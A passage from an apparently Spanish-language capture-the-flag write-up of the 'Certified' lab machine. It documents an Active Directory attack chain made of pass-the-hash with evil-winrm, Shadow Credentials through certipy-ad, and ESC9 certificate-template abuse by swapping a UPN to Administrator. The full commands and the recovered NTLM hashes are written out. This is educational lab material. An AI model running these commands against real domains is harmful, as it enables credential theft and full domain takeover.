+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72">$(</span>ntpdate -q 10.129.1.220 | cut -d <span style="color:#a5d6ff">&#39; &#39;</span> -f 1,2<span style="color:#ff7b72">)</span><span style="color:#a5d6ff">&#34;</span> python3 ../../PKINITtools/getnthash.py -key 1ac56a8011abb27a301823e8e850f0e912e16845d8f5637e78fd6359eda2eb5f  certified.htb/management_svc
+</span></span></code></pre></div><p>Finalmente obtenemos el HASH NT <code>a091c1832bcdd4677c28b5a6a1295584</code> de <code>MANAGEMENT_SVC</code></p>
+<img src="/images/Pasted image 20260522201429.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora podemos utilizar este hash para autenticarnos con <code>evil-winrm</code>, de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
+</span></span></code></pre></div><p>y vemos que nos conectamos exitosamente</p>
+<img src="/images/Pasted image 20260522195536.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora podemos encontrar y leer la flag de <code>user.txt</code></p>
+<img src="/images/Pasted image 20260522195614.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="movimiento-lateral">
+  Movimiento Lateral
+  <a class="heading-link" href="#movimiento-lateral">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Como ahora tenemos acceso al usuario <code>MANAGEMENT_SVC</code>, podemos enumerar los privilegios y relaciones que posee dentro del dominio para identificar posibles vectores de escalación.</p>
+<p>Vemos que la cuenta comprometida <code>MANAGEMENT_SVC</code>, a la cual tenemos acceso mediante su hash NTLM, posee permisos <code>GenericAll</code> sobre el usuario <code>CA_OPERATOR</code>, lo que nos otorga control total sobre dicho objeto y permite realizar acciones como restablecer su contraseña o modificar sus atributos.</p>
+<img src="/images/Pasted image 20260522210900.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por lo cual podemos obtener el <code>HASH NT</code> de <code>CA_OPERATOR</code>, de la misma forma que hicimos con <code>MANAGEMENT_SVC</code>, pero ahora usando el <code>HASH</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72">$(</span>ntpdate -q 10.129.1.220 | cut -d <span style="color:#a5d6ff">&#39; &#39;</span> -f 1,2<span style="color:#ff7b72">)</span><span style="color:#a5d6ff">&#34;</span> certipy-ad shadow auto -u <span style="color:#a5d6ff">&#39;management_svc@certified.htb&#39;</span> -hashes <span style="color:#a5d6ff">&#39;:a091c1832bcdd4677c28b5a6a1295584&#39;</span> -account <span style="color:#a5d6ff">&#39;ca_operator&#39;</span> -dc-ip 10.129.1.220 -dc-host certified.htb
+</span></span></code></pre></div><p>Obteniendo el hash de <code>ca_operator : 0ef3298edfc59e0cd07c56d829eea9c6</code></p>
+<img src="/images/Pasted image 20260522214508.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="escalada-de-privilegios">
+  Escalada de privilegios
+  <a class="heading-link" href="#escalada-de-privilegios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Se realiza una enumeración del servicio ADCS (Active Directory Certificate Services) para verificar si está presente en el dominio y detectar posibles configuraciones o plantillas vulnerables que puedan ser explotadas.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad find -u ca_operator@certified.htb -hashes <span style="color:#a5d6ff">&#39;:0ef3298edfc59e0cd07c56d829eea9c6&#39;</span> -dc-ip 10.129.1.220
+</span></span></code></pre></div><p>Se confirma la presencia del servicio ADCS (Active Directory Certificate Services) dentro del dominio, lo que indica la existencia de una infraestructura de emisión de certificados.</p>
+<img src="/images/Pasted image 20260522220254.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>A partir de esto, se procede a enumerar las plantillas de certificados disponibles con el objetivo de identificar configuraciones inseguras o vulnerabilidades que puedan ser explotadas para escalar privilegios dentro del entorno.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad find -u ca_operator@certified.htb -hashes <span style="color:#a5d6ff">&#39;:0ef3298edfc59e0cd07c56d829eea9c6&#39;</span> -dc-ip 10.129.1.220 -vulnerable -stdout
+</span></span></code></pre></div><p>Se identifica una condición compatible con <strong>ESC9</strong>, donde la validación entre la identidad del usuario y el certificado no se aplica correctamente, permitiendo la suplantación mediante manipulación del <code>userPrincipalName</code>.</p>
+<p>Este escenario habilita un vector de ataque basado en certificados dentro de ADCS, aprovechable para escalamiento de privilegios en el dominio.</p>
+<p>El ataque consiste en modificar temporalmente el <code>userPrincipalName</code> del usuario objetivo para que coincida con la identidad del Administrador.</p>
+<p>Para ello utilizaremos el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator@certified.htb
+</span></span></code></pre></div><p>Teniendo como resultado que el cambio fue exitoso</p>
+<img src="/images/Pasted image 20260522220810.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Una vez modificado temporalmente el <code>UPN</code> del usuario <code>CA_OPERATOR</code>, se solicita un certificado utilizando la plantilla vulnerable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad req -username ca_operator@certified.htb -hashes 0ef3298edfc59e0cd07c56d829eea9c6 -ca certified-DC01-CA -template CertifiedAuthentication
+</span></span></code></pre></div><p>Si la modificación es efectiva, la CA emite un certificado asociado a la identidad del Administrador del dominio.</p>
+<img src="/images/Pasted image 20260522221557.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora modificamos nuevamente el <code>UPN</code> de <code>CA_OPERATOR</code> al que tenía inicialmente, con el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
+</span></span></code></pre></div><p>Viendo que el cambio fue exitoso</p>
+<img src="/images/Pasted image 20260522221826.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Finalmente, se utiliza el archivo <code>.pfx</code> obtenido para autenticarse como el usuario <code>Administrator</code> mediante <code>Certipy</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72">$(</span>ntpdate -q 10.129.1.220 | cut -d <span style="color:#a5d6ff">&#39; &#39;</span> -f 1,2<span style="color:#ff7b72">)</span><span style="color:#a5d6ff">&#34;</span> certipy-ad auth -pfx administrator.pfx -username Administrator -domain certified.htb -dc-ip 10.129.1.220
+</span></span></code></pre></div><p>Obteniendo el hash NTLM del usuario <code>administrator : 0d5b49608bbce1751f708748f67e2d34</code></p>
+<img src="/images/Pasted image 20260522222143.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora podemos autenticarnos con <code>evilwinrm</code> como <code>administrator</code>, de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i certified.htb -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
+</span></span></code></pre></div><p>y entramos exitosamente como el usuario <code>administrator</code></p>
+<img src="/images/Pasted image 20260522222320.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora podemos leer la <code>root.txt</code>, y finalmente comprometimos totalmente la máquina víctima y el DC</p>
+<img src="/images/Pasted image 20260522222408.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="conclusión">
+  Conclusión
+  <a class="heading-link" href="#conclusi%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>La explotación de Certified se basa en una cadena de abusos en Active Directory: delegaciones mal configuradas en ACLs, abuso de Shadow Credentials para comprometer cuentas de servicio y explotación de ADCS mediante ESC9. La combinación de estos vectores permite la toma completa del dominio desde un acceso inicial de bajo privilegio.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
